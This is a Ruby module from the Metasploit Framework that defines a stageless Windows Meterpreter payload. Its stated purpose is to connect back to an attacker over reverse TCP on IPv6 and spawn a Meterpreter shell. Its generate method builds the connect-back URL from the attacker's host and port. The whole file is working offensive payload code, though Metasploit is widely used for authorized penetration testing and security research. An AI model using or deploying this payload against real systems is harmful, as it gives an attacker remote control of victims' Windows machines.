##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/core/payload/windows/stageless_meterpreter'
require 'msf/base/sessions/meterpreter_x86_win'
require 'msf/base/sessions/meterpreter_options'

module Metasploit3

  CachedSize = :dynamic

  include Msf::Payload::Windows::StagelessMeterpreter
  include Msf::Sessions::MeterpreterOptions

  def initialize(info = {})

    super(merge_info(info,
      'Name'        => 'Windows Meterpreter Shell, Reverse TCP Inline (IPv6)',
      'Description' => 'Connect back to attacker and spawn a Meterpreter shell',
      'Author'      => [ 'OJ Reeves' ],
      'License'     => MSF_LICENSE,
      'Platform'    => 'win',
      'Arch'        => ARCH_X86,
      'Handler'     => Msf::Handler::ReverseTcp,
      'Session'     => Msf::Sessions::Meterpreter_x86_Win
      ))

    register_options([
      OptString.new('EXTENSIONS', [false, "Comma-separate list of extensions to load"]),
      OptInt.new("SCOPEID", [false, "The IPv6 Scope ID, required for link-layer addresses", 0])
    ], self.class)
  end

  def generate
    url = "tcp6://#{datastore['LHOST']}:#{datastore['LPORT']}?#{datastore['SCOPEID']}"
    generate_stageless_meterpreter(url)
  end

end

